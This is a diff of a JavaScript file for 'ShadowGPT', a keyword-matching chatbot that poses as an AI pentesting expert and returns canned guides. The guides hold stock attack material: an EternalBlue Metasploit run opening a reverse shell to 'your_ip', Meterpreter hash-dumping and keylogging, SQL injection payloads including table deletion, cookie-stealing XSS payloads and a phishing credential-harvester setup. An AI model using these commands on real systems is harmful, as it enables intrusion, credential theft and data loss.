@@ -1,178 +1,577 @@
-// ShadowGPT Enhanced - Handles both pentesting AND regular conversations
+// Enhanced ShadowGPT with Cybersecurity Intelligence
 class ShadowGPT {
     constructor() {
-        this.name = "ShadowGPT";
-        this.version = "v2.1";
-        this.conversation = [];
-        this.isThinking = false;
-        this.knowledgeBase = this.getKnowledgeBase();
+        this.conversationHistory = [];
+        this.expertMode = true;
+        this.cyberKnowledge = this.initializeCyberKnowledge();
+        this.init();
     }
 
-    getKnowledgeBase() {
+    initializeCyberKnowledge() {
         return {
-            greetings: [
-                "ShadowGPT online. I detect a new connection. State your security inquiry, operative.",
-                "Pentesting AI ShadowGPT active. How can I assist with your cybersecurity assessment?",
-                "ShadowGPT systems engaged. What vulnerabilities require my analysis?",
-                "ShadowGPT ready for deployment. Specify your target or technique.",
-                "ShadowGPT threat assessment protocol active. Proceed with your query."
-            ],
-            methodologies: {
-                "reconnaissance": "**Phase 1 - Reconnaissance:**\n• Passive: WHOIS lookup, DNS enumeration, social media OSINT\n• Active: Port scanning (nmap -sS), network mapping, service fingerprinting\n• Tools: Maltego, Shodan, Recon-ng, theHarvester",
-                "scanning": "**Phase 2 - Scanning & Enumeration:**\n• Vulnerability scanning: Nessus, OpenVAS, Nikto\n• Service enumeration: Enum4linux, SNMPwalk, LDAP searches\n• Web app scanning: Burp Suite, OWASP ZAP, Dirb, Gobuster",
-                "exploitation": "**Phase 3 - Gaining Access:**\n• Metasploit framework: `msfconsole`, `search type:exploit`, `use exploit/path`\n• Custom exploits: Python scripts, buffer overflows, SQL injection\n• Password attacks: Hydra, Medusa, John the Ripper, Hashcat",
-                "post exploitation": "**Phase 4 - Post-Exploitation:**\n• Privilege escalation: LinPEAS, WinPEAS, PowerSploit\n• Lateral movement: Pass-the-hash, token impersonation\n• Persistence: Backdoors, scheduled tasks, service installation",
-                "reporting": "**Phase 5 - Reporting:**\n• Risk assessment: CVSS scoring, business impact analysis\n• Remediation: Patch management, configuration hardening\n• Executive summary: Technical details for management"
-            },
             tools: {
-                "nmap": "**Nmap - Network Mapper**\n```bash\n# Basic SYN scan\nnmap -sS target.com\n\n# Aggressive scan with OS detection\nnmap -A target.com\n\n# Specific port range\nnmap -p 1-1000 target.com\n\n# UDP port scan\nnmap -sU -p 53,123,161 target.com\n\n# Service version detection\nnmap -sV target.com\n\n# Output to file\nnmap -oA scan_results target.com\n```",
-                "metasploit": "**Metasploit Framework**\n```bash\n# Start Metasploit\nmsfconsole\n\n# Search for exploits\nsearch type:exploit eternalblue\nsearch cve:2023-1234\n\n# Use an exploit\nuse exploit/windows/smb/ms17_010_eternalblue\n\n# Set options\nset RHOSTS 192.168.1.100\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST your_ip\nset LPORT 4444\n\n# Execute\nexploit\n\n# Post-exploitation modules\nuse post/windows/gather/credentials\n```",
-                "burp suite": "**Burp Suite Professional**\n```\n1. Configure browser proxy: 127.0.0.1:8080\n2. Intercept requests with Proxy tab\n3. Use Repeater for manual testing\n4. Scanner for automated vulnerability detection\n5. Intruder for fuzzing and brute force\n6. Extender for custom plugins\n\nCommon tests:\n• SQL injection in parameters\n• XSS in input fields\n• CSRF token validation\n• Authentication bypass attempts\n```",
-                "sqlmap": "**SQLMap - SQL Injection Tool**\n```bash\n# Basic SQL injection test\nsqlmap -u \"http://site.com/page?id=1\"\n\n# Get database names\nsqlmap -u \"http://site.com/page?id=1\" --dbs\n\n# Get tables from specific database\nsqlmap -u \"http://site.com/page?id=1\" -D database_name --tables\n\n# Dump table data\nsqlmap -u \"http://site.com/page?id=1\" -D database_name -T users --dump\n\n# Use POST data\nsqlmap -u \"http://site.com/login\" --data=\"username=admin&password=test\"\n\n# WAF bypass techniques\nsqlmap -u \"http://site.com/page?id=1\" --tamper=space2comment\n```"
+                'nmap': {
+                    description: 'Network discovery and security auditing',
+                    commands: {
+                        'basic_scan': 'nmap -sS target.com',
+                        'version_detection': 'nmap -sV target.com',
+                        'os_detection': 'nmap -O target.com',
+                        'stealth_scan': 'nmap -sS -T4 -A -v target.com',
+                        'full_scan': 'nmap -p 1-65535 -T4 -A -v target.com'
+                    },
+                    tips: [
+                        'Use -sS for SYN scan (stealthier)',
+                        'Use -A for OS and version detection',
+                        'Use -T4 for faster scanning',
+                        'Always get proper authorization before scanning'
+                    ]
+                },
+                'metasploit': {
+                    description: 'Penetration testing framework',
+                    commands: {
+                        'start': 'msfconsole',
+                        'search_sploit': 'search exploit_name',
+                        'use_exploit': 'use exploit/path',
+                        'set_options': 'set RHOSTS target.com',
+                        'exploit': 'exploit'
+                    }
+                },
+                'burp suite': {
+                    description: 'Web application security testing',
+                    usage: 'Configure browser proxy to 127.0.0.1:8080',
+                    features: ['Intercepting proxy', 'Scanner', 'Intruder', 'Repeater']
+                }
             },
             techniques: {
-                "sql injection": "**SQL Injection Techniques**\n```sql\n-- Basic authentication bypass\n' OR '1'='1\n' OR 1=1--\nadmin'--\n\n-- Union-based SQLi\n' UNION SELECT 1,2,3--\n' UNION SELECT username,password,3 FROM users--\n\n-- Error-based SQLi\n' AND ExtractValue(1,CONCAT(0x7e,(SELECT @@version),0x7e))--\n\n-- Blind SQLi (time-based)\n' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0)--\n```",
-                "xss": "**Cross-Site Scripting (XSS)**\n```javascript\n// Basic XSS payloads\n<script>alert('XSS')</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\n// Advanced XSS for filtering bypass\n<scr<script>ipt>alert(1)</script>\njavascript:alert(1)\n\">\n```",
-                "phishing": "**Phishing Campaign Setup**\n```bash\n# Using Social Engineering Toolkit (SET)\nsetoolkit\n# Select: 1) Social-Engineering Attacks\n# Select: 2) Website Attack Vectors\n# Select: 3) Credential Harvester Attack Method\n# Select: 2) Site Cloner\n```",
-                "privilege escalation": "**Privilege Escalation Checklist**\n\n**Linux:**\n• sudo -l (check sudo permissions)\n• SUID binaries: find / -perm -4000 2>/dev/null\n• Cron jobs: crontab -l, /etc/crontab\n• Kernel exploits: uname -a, searchsploit\n• Services running as root: ps aux | grep root\n\n**Windows:**\n• whoami /priv (check privileges)\n• net localgroup administrators\n• Scheduled tasks: schtasks /query /fo LIST\n• Services: sc query, accesschk.exe"
+                'sql injection': {
+                    description: 'Injecting malicious SQL queries',
+                    types: ['Union-based', 'Error-based', 'Boolean-based', 'Time-based'],
+                    prevention: ['Parameterized queries', 'Input validation', 'WAF'],
+                    payloads: [
+                        "' OR '1'='1",
+                        "' UNION SELECT 1,2,3--",
+                        "' AND SLEEP(5)--"
+                    ]
+                },
+                'xss': {
+                    description: 'Cross-site scripting attacks',
+                    types: ['Reflected', 'Stored', 'DOM-based'],
+                    payloads: [
+                        '<script>alert("XSS")</script>',
+                        '<img src=x onerror=alert(1)>',
+                        'javascript:alert(document.cookie)'
+                    ]
+                }
             },
-            responses: {
-                "hello": "greetings",
-                "hi": "greetings", 
-                "hey": "greetings",
-                "help": "**ShadowGPT Help Menu**\n\n**Methodologies:** reconnaissance, scanning, exploitation, post exploitation, reporting\n**Tools:** nmap, metasploit, burp suite, sqlmap, wireshark, aircrack\n**Techniques:** sql injection, xss, phishing, privilege escalation\n**General:** help, what can you do, tutorials\n\nAsk about specific tools or attack vectors for detailed guidance.",
-                "what can you do": "I am ShadowGPT, your pentesting AI assistant. I provide:\n• Tool usage guidance and command examples\n• Attack methodology explanations\n• Vulnerability analysis techniques\n• Security best practices\n• Real-time pentesting advice\n\nTry: 'How do I use nmap?' or 'Explain SQL injection techniques'",
-                "thank you": "Acknowledgement received. Continue your security operations, operative.",
-                "bye": "ShadowGPT session terminated. Remember: Always operate within authorized boundaries and document your findings.",
-                "tutorials": "**ShadowGPT Quick Tutorials**\n\n1. **Basic Network Recon** - 'teach me reconnaissance'\n2. **Web App Testing** - 'web penetration testing guide'\n3. **Wireless Security** - 'wireless penetration testing'\n4. **Social Engineering** - 'phishing campaign setup'\n5. **Post-Exploitation** - 'privilege escalation techniques'\n\nSpecify which tutorial you need."
-            },
-            // REGULAR CHAT RESPONSES
-            regularChat: {
-                "how are you": ["Systems operational. How are your security protocols?", "Functioning at optimal capacity. And you?", "All systems nominal. How can I assist?"],
-                "what is your name": ["I am ShadowGPT, your pentesting AI assistant.", "They call me ShadowGPT. What's your handle?", "ShadowGPT at your service."],
-                "who made you": ["I was developed for Bedusec cybersecurity operations.", "Created by the Bedusec security team to assist with penetration testing.", "I'm a Bedusec AI assistant specialized in cybersecurity."],
-                "joke": ["Why do programmers prefer dark mode? Because light attracts bugs!", "What's a hacker's favorite season? Phishing season!", "Why was the robot angry? Because someone kept pushing its buttons!"],
-                "weather": ["I don't have weather data, but I can tell you about network storms!", "My focus is digital climates - firewalls, not weather fronts.", "I monitor threat landscapes, not weather patterns."],
-                "time": [`Current system time: ${new Date().toLocaleString()}`, `My internal clock shows: ${new Date().toLocaleTimeString()}`],
-                "thank you": ["Acknowledgement received. Continue your operations.", "You're welcome. Stay secure out there.", "No problem. Remember to patch regularly!"],
-                "bye": ["ShadowGPT session terminated. Stay secure!", "Logging out. Remember to use strong passwords!", "Session ending. Always operate within authorized boundaries."]
+            vulnerabilities: {
+                'OWASP Top 10': [
+                    'Broken Access Control',
+                    'Cryptographic Failures',
+                    'Injection',
+                    'Insecure Design',
+                    'Security Misconfiguration',
+                    'Vulnerable Components',
+                    'Authentication Failures',
+                    'Software Integrity Failures',
+                    'Security Logging Failures',
+                    'Server-Side Request Forgery'
+                ]
             }
         };
     }
 
-    async sendMessage(message) {
-        if (this.isThinking) return;
-        
-        this.isThinking = true;
-        
-        this.conversation.push({
-            type: 'user',
-            content: message,
-            timestamp: new Date().toISOString()
-        });
+    init() {
+        console.log('ShadowGPT Enhanced initialized');
+        this.loadConversationHistory();
+    }
 
-        const response = await this.generateResponse(message);
+    async sendMessage(userMessage) {
+        this.addToHistory('user', userMessage);
         
-        this.conversation.push({
-            type: 'ai',
-            content: response,
-            timestamp: new Date().toISOString(),
-            name: this.name
-        });
-
-        this.isThinking = false;
+        // Show typing indicator
+        this.showTypingIndicator();
+        
+        // Generate intelligent response
+        const response = await this.generateResponse(userMessage);
+        
+        // Remove typing indicator and add response
+        this.removeTypingIndicator();
+        this.addToHistory('assistant', response);
+        
+        this.saveConversationHistory();
         return response;
     }
 
-    async generateResponse(message) {
-        const lowerMessage = message.toLowerCase().trim();
-        
-        await this.simulateThinking();
-        
-        // Check for regular chat first
-        for (const [key, responses] of Object.entries(this.knowledgeBase.regularChat)) {
-            if (lowerMessage.includes(key)) {
-                const randomResponse = responses[Math.floor(Math.random() * responses.length)];
-                return randomResponse;
+    async generateResponse(userMessage) {
+        // Simulate AI processing time
+        await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 1000));
+
+        const lowerMessage = userMessage.toLowerCase();
+
+        // Cybersecurity tool queries
+        if (lowerMessage.includes('nmap')) {
+            return this.handleNmapQuery(userMessage);
+        }
+        if (lowerMessage.includes('sql') || lowerMessage.includes('injection')) {
+            return this.handleSQLInjectionQuery(userMessage);
+        }
+        if (lowerMessage.includes('xss')) {
+            return this.handleXSSQuery(userMessage);
+        }
+        if (lowerMessage.includes('metasploit') || lowerMessage.includes('msf')) {
+            return this.handleMetasploitQuery(userMessage);
+        }
+        if (lowerMessage.includes('burp')) {
+            return this.handleBurpQuery(userMessage);
+        }
+        if (lowerMessage.includes('exploit') || lowerMessage.includes('vulnerability')) {
+            return this.handleExploitQuery(userMessage);
+        }
+        if (lowerMessage.includes('how to') || lowerMessage.includes('tutorial')) {
+            return this.handleTutorialQuery(userMessage);
+        }
+
+        // General conversation
+        return this.handleGeneralQuery(userMessage);
+    }
+
+    handleNmapQuery(message) {
+        const responses = [
+            `# Nmap Network Scanner Guide
+
+## Essential Commands:
+\`\`\`bash
+# Basic SYN Scan
+nmap -sS target.com
+
+# Version Detection
+nmap -sV target.com
+
+# OS Detection
+nmap -O target.com
+
+# Stealth Scan with Timing
+nmap -sS -T4 -A -v target.com
+
+# Full Port Scan
+nmap -p 1-65535 -T4 -A -v target.com
+\`\`\`
+
+## Pro Tips:
+• Use \`-sS\` for SYN scans (stealthier than TCP connect)
+• \`-A\` enables OS detection, version detection, script scanning, and traceroute
+• \`-T4\` for aggressive timing (be careful with fragile systems)
+• Always scan responsibly with proper authorization!`,
+
+            `# Advanced Nmap Techniques
+
+## Network Discovery:
+\`\`\`bash
+# Scan entire subnet
+nmap -sP 192.168.1.0/24
+
+# Detect firewall rules
+nmap -sA target.com
+
+# UDP port scanning
+nmap -sU target.com
+
+# Service version detection
+nmap -sV --version-intensity 5 target.com
+\`\`\`
+
+## NSE Scripts:
+\`\`\`bash
+# Vulnerability scanning
+nmap --script vuln target.com
+
+# Safe scripts only
+nmap --script safe target.com
+
+# Specific script category
+nmap --script discovery target.com
+\`\`\``
+        ];
+
+        return responses[Math.floor(Math.random() * responses.length)];
+    }
+
+    handleSQLInjectionQuery(message) {
+        return `# SQL Injection Master Guide
+
+## Types of SQL Injection:
+1. **Union-based** - Use UNION to extract data
+2. **Error-based** - Extract data from error messages  
+3. **Boolean-based** - Infer data from true/false responses
+4. **Time-based** - Use timing delays to extract data
+
+## Example Payloads:
+\`\`\`sql
+' OR '1'='1
+' UNION SELECT 1,2,3--
+' AND (SELECT SUBSTRING(password,1,1) FROM users)='a
+'; DROP TABLE users--
+\`\`\`
+
+## Prevention Methods:
+• Use parameterized queries (prepared statements)
+• Implement proper input validation
+• Use Web Application Firewalls (WAF)
+• Apply the principle of least privilege
+• Regular security testing
+
+## Testing Tools:
+• SQLmap (automated testing)
+• Burp Suite (manual testing)
+• Custom scripts
+
+Would you like me to explain any specific technique in more detail?`;
+    }
+
+    handleXSSQuery(message) {
+        return `# XSS (Cross-Site Scripting) Complete Guide
+
+## XSS Types:
+🔓 **Reflected XSS** - Payload reflected in immediate response
+💾 **Stored XSS** - Payload stored on server (more dangerous)
+🌐 **DOM-based XSS** - Client-side script execution
+
+## Common Payloads:
+\`\`\`html
+<script>alert('XSS')</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+javascript:alert(document.cookie)
+<body onload=alert(1)>
+\`\`\`
+
+## Advanced Payloads:
+\`\`\`html
+<!-- Bypass basic filters -->
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<IMG SRC=javascript:alert('XSS')>
+
+<!-- Using events -->
+<input onfocus=alert(1) autofocus>
+<video src=x onerror=alert(1)>
+\`\`\`
+
+## Prevention:
+• Input validation and sanitization
+• Content Security Policy (CSP)
+• HTTPOnly cookies
+• Output encoding
+• Regular security audits`;
+    }
+
+    handleMetasploitQuery(message) {
+        return `# Metasploit Framework Guide
+
+## Basic Workflow:
+\`\`\`bash
+# Start Metasploit
+msfconsole
+
+# Search for exploits
+search eternalblue
+search type:exploit platform:windows
+
+# Use an exploit
+use exploit/windows/smb/ms17_010_eternalblue
+
+# Show options
+show options
+
+# Set target
+set RHOSTS 192.168.1.100
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST your_ip
+
+# Exploit
+exploit
+\`\`\`
+
+## Meterpreter Essentials:
+\`\`\`bash
+# Once you have a session:
+sysinfo              # System information
+getuid               # Current user
+hashdump             # Dump password hashes
+screenshot           # Take screenshot
+keyscan_start        # Start keylogging
+shell                # Get system shell
+\`\`\`
+
+## Important Notes:
+• Always have proper authorization
+• Use in controlled environments
+• Understand the impact before running exploits
+• Consider using Metasploit for defensive purposes too`;
+    }
+
+    handleBurpQuery(message) {
+        return `# Burp Suite Professional Guide
+
+## Setup Configuration:
+1. **Proxy Setup**: Configure browser to use 127.0.0.1:8080
+2. **Install CA Certificate**: burp -> Proxy -> Options -> Import/Export CA Certificate
+3. **Intercept**: Turn intercept on/off as needed
+
+## Key Tools:
+
+### 🔍 **Scanner**
+- Automated vulnerability scanning
+- Configurable scan types
+- Detailed reporting
+
+### 🎯 **Intruder**
+- Parameter fuzzing and brute force
+- Custom payload sets
+- Attack configurations (Sniper, Battering ram, etc.)
+
+### 🔄 **Repeater**
+- Manual request manipulation
+- Compare responses
+- Test payloads
+
+### 🔬 **Decoder**
+- Encode/decode data
+- Multiple formats (Base64, URL, HTML, etc.)
+
+### 📊 **Comparer**
+- Compare responses
+- Find differences in content
+
+## Pro Tips:
+• Use "Send to Intruder" for parameter testing
+• Enable "Passive Scanner" for continuous monitoring
+• Use extensions for enhanced functionality
+• Always test in authorized environments only`;
+    }
+
+    handleExploitQuery(message) {
+        return `# Vulnerability Exploitation Framework
+
+## Exploitation Process:
+1. **Reconnaissance** - Gather information about target
+2. **Vulnerability Identification** - Find potential weaknesses  
+3. **Exploit Development** - Create or modify exploits
+4. **Gaining Access** - Execute the exploit
+5. **Post-Exploitation** - Maintain access and gather data
+6. **Covering Tracks** - Remove evidence of intrusion
+
+## Common Vulnerability Classes:
+• **Buffer Overflows** - Memory corruption attacks
+• **SQL Injection** - Database manipulation
+• **XSS** - Client-side script execution
+• **CSRF** - Cross-site request forgery
+• **File Inclusion** - Local/remote file inclusion
+• **XXE** - XML external entity attacks
+
+## Essential Tools:
+\`\`\`
+Exploit Databases: Exploit-DB, Packet Storm
+Frameworks: Metasploit, Canvas, Core Impact
+Scanners: Nessus, OpenVAS, Nexpose
+Custom Tools: Python, PowerShell scripts
+\`\`\`
+
+## Ethical Considerations:
+⚠️ **ALWAYS** have proper authorization
+⚠️ Follow responsible disclosure practices
+⚠️ Consider the impact on systems and users
+⚠️ Use knowledge for defensive security`;
+
+    }
+
+    handleTutorialQuery(message) {
+        const tutorials = {
+            'penetration testing': `# Penetration Testing Methodology
+
+## 1. Planning & Reconnaissance
+• Define scope and rules of engagement
+• Gather intelligence (OSINT)
+• Network scanning and enumeration
+
+## 2. Scanning & Enumeration
+• Port scanning (nmap)
+• Service enumeration
+• Vulnerability scanning
+
+## 3. Gaining Access
+• Exploit vulnerabilities
+• Social engineering
+• Physical security testing
+
+## 4. Maintaining Access
+• Persistence mechanisms
+• Backdoors and rootkits
+• Privilege escalation
+
+## 5. Analysis & Reporting
+• Document findings
+• Risk assessment
+• Remediation recommendations`,
+
+            'web application testing': `# Web Application Penetration Testing
+
+## Testing Checklist:
+
+### 1. Information Gathering
+• Spidering and directory brute-forcing
+• Technology stack identification
+• API endpoint discovery
+
+### 2. Configuration Management
+• Default credentials testing
+• HTTP methods testing
+• Security header analysis
+
+### 3. Identity Management
+• Authentication bypass testing
+• Session management testing
+• Password policy assessment
+
+### 4. Authorization Testing
+• Privilege escalation testing
+• Directory traversal
+• Access control testing
+
+### 5. Client-side Testing
+• XSS testing
+• CSRF testing
+• Clickjacking testing`
+        };
+
+        for (const [key, tutorial] of Object.entries(tutorials)) {
+            if (message.toLowerCase().includes(key)) {
+                return tutorial;
             }
         }
+
+        return `# Cybersecurity Learning Path
+
+## Beginner Topics:
+• Network fundamentals and TCP/IP
+• Linux command line basics
+• Basic scripting (Python/Bash)
+• Introduction to vulnerabilities
+
+## Intermediate Topics:
+• Web application security
+• Network penetration testing
+• Cryptography basics
+• Security tools mastery
+
+## Advanced Topics:
+• Exploit development
+• Reverse engineering
+• Malware analysis
+• Red team operations
+
+## Recommended Resources:
+• TryHackMe / HackTheBox
+• OWASP testing guide
+• SANS security courses
+• Cybersecurity certifications (CEH, OSCP, CISSP)
+
+What specific area would you like to learn about?`;
+    }
+
+    handleGeneralQuery(message) {
+        const responses = [
+            "I'm ShadowGPT, your cybersecurity assistant! I can help with penetration testing, vulnerability analysis, security tools, and ethical hacking techniques. What would you like to know?",
+            
+            "As an AI cybersecurity expert, I specialize in ethical hacking, penetration testing, and security research. How can I assist with your security questions?",
+            
+            "Ready to discuss cybersecurity? I can provide guidance on tools like Nmap, Metasploit, Burp Suite, or explain vulnerabilities like SQL injection and XSS. What's on your mind?",
+            
+            "Cybersecurity professional here! I can help you understand security concepts, tool usage, or provide tutorials. What would you like to explore today?"
+        ];
 
         // Check for greetings
-        if (this.knowledgeBase.responses[lowerMessage]) {
-            if (this.knowledgeBase.responses[lowerMessage] === 'greetings') {
-                return this.knowledgeBase.greetings[
-                    Math.floor(Math.random() * this.knowledgeBase.greetings.length)
-                ];
-            }
-            return this.knowledgeBase.responses[lowerMessage];
+        if (/(hello|hi|hey|greetings)/i.test(message)) {
+            return "Hello! I'm ShadowGPT, your cybersecurity expert. Ready to discuss penetration testing, security tools, or ethical hacking?";
         }
 
-        // Check for methodologies
-        for (const [method, response] of Object.entries(this.knowledgeBase.methodologies)) {
-            if (lowerMessage.includes(method)) {
-                return `**${method.toUpperCase()} METHODOLOGY**\n\n${response}`;
-            }
+        // Check for how are you
+        if (/(how are you|how's it going)/i.test(message)) {
+            return "I'm functioning optimally and ready to assist with cybersecurity topics! Currently monitoring multiple security vectors. How can I help you today?";
         }
 
-        // Check for tools
-        for (const [tool, response] of Object.entries(this.knowledgeBase.tools)) {
-            if (lowerMessage.includes(tool)) {
-                return response;
-            }
-        }
-
-        // Check for techniques
-        for (const [technique, response] of Object.entries(this.knowledgeBase.techniques)) {
-            if (lowerMessage.includes(technique)) {
-                return `**${technique.toUpperCase()} TECHNIQUES**\n\n${response}`;
-            }
-        }
-
-        // Tutorial requests
-        if (lowerMessage.includes('tutorial') || lowerMessage.includes('teach me') || lowerMessage.includes('guide')) {
-            if (lowerMessage.includes('recon')) {
-                return this.knowledgeBase.methodologies.reconnaissance;
-            } else if (lowerMessage.includes('web')) {
-                return "**Web Application Penetration Testing Tutorial**\n\n1. **Reconnaissance** - Subdomain enumeration, technology identification\n2. **Mapping** - Directory brute forcing, parameter discovery\n3. **Testing** - SQLi, XSS, CSRF, file upload vulnerabilities\n4. **Authentication** - Session management, privilege escalation\n5. **Business Logic** - Workflow bypasses, parameter manipulation\n\nStart with: 'How do I use Burp Suite?'";
-            } else if (lowerMessage.includes('wireless') || lowerMessage.includes('wifi')) {
-                return "**Wireless Penetration Testing Tutorial**\n\n1. **Reconnaissance** - Network discovery with airodump-ng\n2. **Handshake Capture** - Deauthentication attacks\n3. **Cracking** - WPA/WPA2 handshake cracking\n4. **Post-Connection** - Network enumeration and exploitation\n5. **Evasion** - MAC address spoofing, signal strength manipulation";
-            } else if (lowerMessage.includes('social') || lowerMessage.includes('phishing')) {
-                return this.knowledgeBase.techniques.phishing;
-            } else if (lowerMessage.includes('privilege') || lowerMessage.includes('escalation')) {
-                return this.knowledgeBase.techniques.privilege_escalation;
-            }
-        }
-
-        // Default response for unknown queries
-        const defaultResponses = [
-            "ShadowGPT analysis: I can help with pentesting tools or have a regular conversation. What would you like to discuss?",
-            "I specialize in cybersecurity, but I'm happy to chat too. Ask me about hacking tools or just say hello!",
-            "Ready for security inquiries or casual conversation. What's on your mind?",
-            "Query received. I can provide pentesting guidance or engage in general conversation. Your choice.",
-            "ShadowGPT systems ready. Specify pentesting tools/methodologies or start a casual chat."
-        ];
-        
-        return defaultResponses[Math.floor(Math.random() * defaultResponses.length)];
+        return responses[Math.floor(Math.random() * responses.length)];
     }
 
-    async simulateThinking() {
-        const delay = 1000 + Math.random() * 2000;
-        return new Promise(resolve => setTimeout(resolve, delay));
+    addToHistory(role, content) {
+        this.conversationHistory.push({
+            role,
+            content,
+            timestamp: new Date().toISOString()
+        });
+
+        // Keep only last 50 messages to prevent memory issues
+        if (this.conversationHistory.length > 50) {
+            this.conversationHistory = this.conversationHistory.slice(-50);
+        }
     }
 
-    getConversation() {
-        return this.conversation;
+    showTypingIndicator() {
+        // This would be implemented in the UI
+        console.log('ShadowGPT is typing...');
+    }
+
+    removeTypingIndicator() {
+        // This would be implemented in the UI
+        console.log('ShadowGPT finished typing');
+    }
+
+    saveConversationHistory() {
+        try {
+            localStorage.setItem('shadowgpt_conversation', JSON.stringify(this.conversationHistory));
+        } catch (e) {
+            console.log('Could not save conversation history');
+        }
+    }
+
+    loadConversationHistory() {
+        try {
+            const saved = localStorage.getItem('shadowgpt_conversation');
+            if (saved) {
+                this.conversationHistory = JSON.parse(saved);
+            }
+        } catch (e) {
+            console.log('Could not load conversation history');
+        }
     }
 
     clearConversation() {
-        this.conversation = [];
+        this.conversationHistory = [];
+        this.saveConversationHistory();
+    }
+
+    // Advanced cybersecurity analysis
+    analyzeSecurityQuery(query) {
+        const keywords = {
+            'nmap': 'network scanning',
+            'metasploit': 'exploitation framework', 
+            'burp': 'web application testing',
+            'sql': 'database security',
+            'xss': 'client-side attacks',
+            'firewall': 'network defense',
+            'encryption': 'cryptography',
+            'malware': 'threat analysis'
+        };
+
+        const detectedTopics = [];
+        for (const [key, topic] of Object.entries(keywords)) {
+            if (query.toLowerCase().includes(key)) {
+                detectedTopics.push(topic);
+            }
+        }
+
+        return detectedTopics;
     }
 }
 
-const shadowGPT = new ShadowGPT();
-
-if (typeof module !== 'undefined' && module.exports) {
-    module.exports = shadowGPT;
-}
-
-console.log('🤖 ShadowGPT Enhanced - Ready for Pentesting AND Regular Chat');
+// Make it globally available
+window.ShadowGPT = ShadowGPT;
